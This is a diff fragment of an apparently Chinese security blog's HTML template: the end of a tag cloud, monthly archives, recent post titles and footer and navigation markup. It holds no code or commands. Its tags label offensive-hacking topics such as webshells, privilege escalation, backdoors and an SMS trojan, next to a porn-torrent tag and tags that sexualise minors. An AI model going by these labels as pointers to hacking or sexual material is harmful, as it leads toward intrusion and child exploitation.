href="/tag/动易/" style="font-size: 10px;">动易</a> <a href="/tag/包含漏洞/" style="font-size: 10px;">包含漏洞</a> <a href="/tag/千斤顶/" style="font-size: 10px;">千斤顶</a> <a href="/tag/卫星/" style="font-size: 10px;">卫星</a> <a href="/tag/压力测试/" style="font-size: 10px;">压力测试</a> <a href="/tag/去广告/" style="font-size: 10px;">去广告</a> <a href="/tag/双系统/" style="font-size: 10px;">双系统</a> <a href="/tag/反向代理/" style="font-size: 10px;">反向代理</a> <a href="/tag/反弹后门/" style="font-size: 10px;">反弹后门</a> <a href="/tag/后台/" style="font-size: 10px;">后台</a> <a href="/tag/后台拿shell/" style="font-size: 10px;">后台拿shell</a> <a href="/tag/后门/" style="font-size: 10px;">后门</a> <a href="/tag/周星驰/" style="font-size: 10px;">周星驰</a> <a href="/tag/命令/" style="font-size: 11px;">命令</a> <a href="/tag/命令行开启3389/" style="font-size: 10px;">命令行开启3389</a> <a href="/tag/和谐体/" style="font-size: 11px;">和谐体</a> <a href="/tag/嗅探/" style="font-size: 11px;">嗅探</a> <a href="/tag/团购/" style="font-size: 10px;">团购</a> <a href="/tag/大黑阔/" style="font-size: 12px;">大黑阔</a> <a href="/tag/天融信/" style="font-size: 10px;">天融信</a> <a href="/tag/存储/" style="font-size: 10px;">存储</a> <a href="/tag/安全/" style="font-size: 10px;">安全</a> <a href="/tag/安全加固/" style="font-size: 11px;">安全加固</a> <a href="/tag/安全狗/" style="font-size: 10px;">安全狗</a> <a href="/tag/小黑客/" style="font-size: 10px;">小黑客</a> <a href="/tag/幼女/" style="font-size: 10px;">幼女</a> <a href="/tag/开发/" style="font-size: 10px;">开发</a> <a href="/tag/开源/" style="font-size: 10px;">开源</a> <a href="/tag/弱口令/" style="font-size: 10px;">弱口令</a> <a href="/tag/性侵/" style="font-size: 10px;">性侵</a> <a href="/tag/手工注入/" style="font-size: 11px;">手工注入</a> <a href="/tag/批处理/" style="font-size: 10px;">批处理</a> <a href="/tag/抓鸡/" style="font-size: 10px;">抓鸡</a> <a href="/tag/护卫神/" style="font-size: 10px;">护卫神</a> <a href="/tag/拿Webshell/" style="font-size: 10px;">拿Webshell</a> <a href="/tag/拿shell/" style="font-size: 10px;">拿shell</a> <a href="/tag/提权/" style="font-size: 16px;">提权</a> <a href="/tag/搜索型注入/" style="font-size: 10px;">搜索型注入</a> <a href="/tag/搜索引擎/" style="font-size: 10px;">搜索引擎</a> <a href="/tag/教程/" style="font-size: 10px;">教程</a> <a href="/tag/斯坦福大学公开课/" style="font-size: 10px;">斯坦福大学公开课</a> <a href="/tag/新水浒传/" style="font-size: 10px;">新水浒传</a> <a href="/tag/日志分析/" style="font-size: 11px;">日志分析</a> <a href="/tag/日站/" style="font-size: 10px;">日站</a> <a href="/tag/显示快捷方式的箭头/" style="font-size: 10px;">显示快捷方式的箭头</a> <a href="/tag/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tag/暴雷/" style="font-size: 10px;">暴雷</a> <a href="/tag/最土/" style="font-size: 10px;">最土</a> <a href="/tag/服务器/" style="font-size: 10px;">服务器</a> <a href="/tag/服务器维护/" style="font-size: 10px;">服务器维护</a> <a href="/tag/权限/" style="font-size: 10px;">权限</a> <a href="/tag/某某网络渗透测试报告/" style="font-size: 10px;">某某网络渗透测试报告</a> <a href="/tag/检测/" style="font-size: 12px;">检测</a> <a href="/tag/比特币/" style="font-size: 10px;">比特币</a> <a href="/tag/水浒传/" style="font-size: 10px;">水浒传</a> <a href="/tag/水浒传全集/" style="font-size: 10px;">水浒传全集</a> <a href="/tag/注入/" style="font-size: 15px;">注入</a> <a href="/tag/注入漏洞/" style="font-size: 11px;">注入漏洞</a> <a href="/tag/泷泽萝拉-滝泽ローラ-Takizawa-Laura-ABS-130种子下载/" style="font-size: 10px;">泷泽萝拉 滝泽ローラ Takizawa Laura ABS 130种子下载</a> <a href="/tag/添加swap空间/" style="font-size: 10px;">添加swap空间</a> <a href="/tag/渗透/" style="font-size: 20px;">渗透</a> <a href="/tag/渗透实例/" style="font-size: 10px;">渗透实例</a> <a href="/tag/渗透测试/" style="font-size: 16px;">渗透测试</a> <a href="/tag/渗透测试报告/" style="font-size: 10px;">渗透测试报告</a> <a href="/tag/源码审计/" style="font-size: 10px;">源码审计</a> <a href="/tag/溢出/" style="font-size: 12px;">溢出</a> <a href="/tag/漏洞/" style="font-size: 18px;">漏洞</a> <a href="/tag/爆路径/" style="font-size: 11px;">爆路径</a> <a href="/tag/狗日的腾讯/" style="font-size: 10px;">狗日的腾讯</a> <a href="/tag/田众和/" style="font-size: 10px;">田众和</a> <a href="/tag/电影合集/" style="font-size: 10px;">电影合集</a> <a href="/tag/病毒/" style="font-size: 10px;">病毒</a> <a href="/tag/监控拦截系统/" style="font-size: 10px;">监控拦截系统</a> <a href="/tag/短信拦截马/" style="font-size: 10px;">短信拦截马</a> <a href="/tag/破解/" style="font-size: 10px;">破解</a> <a href="/tag/碟中谍4/" style="font-size: 10px;">碟中谍4</a> <a href="/tag/社工/" style="font-size: 12px;">社工</a> <a href="/tag/社工库/" style="font-size: 10px;">社工库</a> <a href="/tag/神器/" style="font-size: 10px;">神器</a> <a href="/tag/移动APP漏洞/" style="font-size: 10px;">移动APP漏洞</a> <a href="/tag/移动宽带垃圾/" style="font-size: 10px;">移动宽带垃圾</a> <a href="/tag/突破/" style="font-size: 10px;">突破</a> <a href="/tag/突破星外/" style="font-size: 10px;">突破星外</a> <a href="/tag/窃听/" style="font-size: 10px;">窃听</a> <a href="/tag/管理系统/" style="font-size: 10px;">管理系统</a> <a href="/tag/结构查看/" style="font-size: 10px;">结构查看</a> <a href="/tag/缓冲区溢出/" style="font-size: 10px;">缓冲区溢出</a> <a href="/tag/编辑器/" style="font-size: 10px;">编辑器</a> <a href="/tag/网络安全/" style="font-size: 11px;">网络安全</a> <a href="/tag/网络电话/" style="font-size: 10px;">网络电话</a> <a href="/tag/网络钓鱼/" style="font-size: 10px;">网络钓鱼</a> <a href="/tag/美少女/" style="font-size: 10px;">美少女</a> <a href="/tag/翻墙/" style="font-size: 10px;">翻墙</a> <a href="/tag/胖子/" style="font-size: 10px;">胖子</a> <a href="/tag/腾讯垃圾/" style="font-size: 10px;">腾讯垃圾</a> <a href="/tag/自由/" style="font-size: 10px;">自由</a> <a href="/tag/色情/" style="font-size: 10px;">色情</a> <a href="/tag/菜刀/" style="font-size: 11px;">菜刀</a> <a href="/tag/萝莉/" style="font-size: 10px;">萝莉</a> <a href="/tag/虚拟主机/" style="font-size: 10px;">虚拟主机</a> <a href="/tag/虚拟主机控制面板/" style="font-size: 10px;">虚拟主机控制面板</a> <a href="/tag/虚拟化/" style="font-size: 10px;">虚拟化</a> <a href="/tag/虚拟机/" style="font-size: 10px;">虚拟机</a> <a href="/tag/蜜罐/" style="font-size: 10px;">蜜罐</a> <a href="/tag/蠕虫/" style="font-size: 10px;">蠕虫</a> <a href="/tag/记事狗/" style="font-size: 10px;">记事狗</a> <a href="/tag/误删书签/" style="font-size: 10px;">误删书签</a> <a href="/tag/轻量级Linux/" style="font-size: 10px;">轻量级Linux</a> <a href="/tag/输入法/" style="font-size: 10px;">输入法</a> <a href="/tag/运维/" style="font-size: 11px;">运维</a> <a href="/tag/通杀漏洞/" style="font-size: 10px;">通杀漏洞</a> <a href="/tag/速成建站/" style="font-size: 10px;">速成建站</a> <a href="/tag/邮件注入/" style="font-size: 10px;">邮件注入</a> <a href="/tag/钓鱼/" style="font-size: 10px;">钓鱼</a> <a href="/tag/银行/" style="font-size: 10px;">银行</a> <a href="/tag/银行信息/" style="font-size: 10px;">银行信息</a> <a href="/tag/键盘上的符号英文怎么读/" style="font-size: 10px;">键盘上的符号英文怎么读</a> <a href="/tag/防黑/" style="font-size: 10px;">防黑</a> <a href="/tag/阳光娱乐联盟/" style="font-size: 10px;">阳光娱乐联盟</a> <a href="/tag/集群/" style="font-size: 10px;">集群</a> <a href="/tag/面向对象/" style="font-size: 10px;">面向对象</a> <a href="/tag/黑产/" style="font-size: 11px;">黑产</a> <a href="/tag/黑客/" style="font-size: 15px;">黑客</a> <a href="/tag/黑帽/" style="font-size: 10px;">黑帽</a> <a href="/tag/黑盒分析/" style="font-size: 10px;">黑盒分析</a> <a href="/tag/黑站/" style="font-size: 10px;">黑站</a> <a href="/tag/黑色产业/" style="font-size: 10px;">黑色产业</a> <a href="/tag/黑阔/" style="font-size: 10px;">黑阔</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">June 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/05/">May 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">February 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">October 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">September 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">August 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">July 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">June 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">May 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">March 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/02/">February 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">January 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">November 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">October 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">September 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">August 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/1145.seo/">Burpsuite之Burp Collaborator模块介绍</a>
-          </li>
-        
-          <li>
-            <a href="/1144.seo/">Debian 8.3 Mate搭建渗透测试环境</a>
-          </li>
-        
-          <li>
-            <a href="/1143.seo/">Debian Jessie搭建Mattermost</a>
-          </li>
-        
-          <li>
-            <a href="/1142.seo/">C# IPv6的Socket编程</a>
-          </li>
-        
-          <li>
-            <a href="/1141.seo/">JDWP系统命令漏洞执行利用实例</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2016 Secer<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
 </footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
 
 
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
-<script src="/js/script.js"></script>
 
   </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archive"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>
+
+</nav>
+
+</div>
 </body>
 </html>
